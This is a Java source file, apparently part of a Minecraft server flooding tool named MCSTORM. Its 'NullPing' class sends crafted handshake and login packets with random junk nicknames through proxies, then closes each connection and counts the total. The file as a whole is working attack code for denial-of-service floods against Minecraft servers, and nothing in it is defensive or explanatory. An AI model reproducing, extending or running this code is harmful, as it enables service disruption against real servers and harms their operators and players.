package io.MCSTORM.methods;


import io.MCSTORM.Main;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Random;


public class NullPing
        implements Method {
    final int a = Integer.parseInt(System.getProperty("len", "25555"));
    SecureRandom r;
    String lol;

    public NullPing() {

        byte[] array = new byte[14];

        (new Random()).nextBytes(array);

        String generatedString = new String(array, StandardCharsets.UTF_8);

        this.lol = generatedString;

    }


    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {

        while ((paramInt & 0xFFFFFF80) != 0) {
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;

        }

        out.writeByte(paramInt);

    }


    public void accept(Channel channel, ProxyLoader.Proxy proxy) {

        ByteBuf b = Unpooled.buffer();

        ByteBufOutputStream out = new ByteBufOutputStream(b);

        try {
            out.write(13 + Main.protocolLength);
            out.write(0);
            writeVarInt(out, Main.protcolID);
            out.write(9);
            out.writeBytes("localhost");
            out.write(99);
            out.write(223);
            String nick = this.lol + "_MCFLEX";
            out.write(nick.length() + 3);
            out.write(0);
            out.write(nick.length());
            out.writeBytes(nick);
            out.write(-71);
            out.close();

        } catch (IOException e) {
            e.printStackTrace();

        }

        channel.writeAndFlush(b);

        NettyBootstrap.integer++;

        NettyBootstrap.totalConnections++;

        channel.close();

    }

}


